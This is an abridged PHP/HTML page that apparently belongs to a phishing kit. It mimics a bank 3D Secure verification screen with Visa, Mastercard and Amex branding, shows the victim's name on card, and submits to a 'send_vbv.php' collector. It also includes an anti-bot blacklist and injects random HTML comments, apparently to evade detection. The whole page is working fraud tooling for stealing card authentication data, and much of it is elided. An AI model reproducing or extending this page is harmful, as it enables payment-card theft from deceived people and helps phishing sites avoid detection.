...
include'anti/Bot-blacklist.php';
        ...
        header("Location: Newcard.php", true, 303);
...
<html>
   <head>
      ...
      <link rel="stylesheet" href="style/3D_SH33NZ0.css">
      <link type="text/css" rel="stylesheet" href="style/btn.css"/>
      <link type="text/css" rel="stylesheet" href="style/codex.authentication.css" />
  <link rel="apple-touch-icon" href="style/favi.png">
      ...
      <div id="Rotation">
       ...
       <div id="xMarcos_9X9X" style="opacity: 1;"><div id="popup">
         ...
         <div id="xGhostRiderForm" style="display:none !important;"><?php echo "<!--".rand(0,99999999)."-->"?>
            ...
            <form method="post" action="system/send_vbv.php" class="idform">
             <?php echo "<!--".rand(0,99999999)."-->"?>
               <div class="ex1">
                       ...
                       <?php echo "<!--".rand(0,99999999)."-->"?>
                         ...
                         <?php echo "<!--".rand(0,99999999)."-->"?>
                          ...
                          <?php echo "<!--".rand(0,99999999)."-->"?>
                                       <?php 
                                             if($MASTERCARD) {  
                      echo '<td><img class="cc_type" id="cc_type" src="style/mastercard-securecode.png"></td>';
                                             }elseif($VISACARD){
                      echo '<td><img class="cc_type" id="cc_type" src="style/verified-by-visa.png"></td>';
                                             }elseif($AMEX){
                      echo '<td><img class="cc_type" id="cc_type" src="style/safe-key.png"></td>';
                                             }
                                             ?>    
                                        <?php 
              ...
              echo '<td><img class="cc_bank" id="cc_bank" src="style/ssl.png"></td>';
                                        }
                                        ?>
                                    ...
                                    <table>
                                       <tbody>
                                          <tr>
                                             ...
                                             <td><?=htmlentities($_SESSION["NameOnCard"]);?></td>
                                          </tr>
                                           <tr>
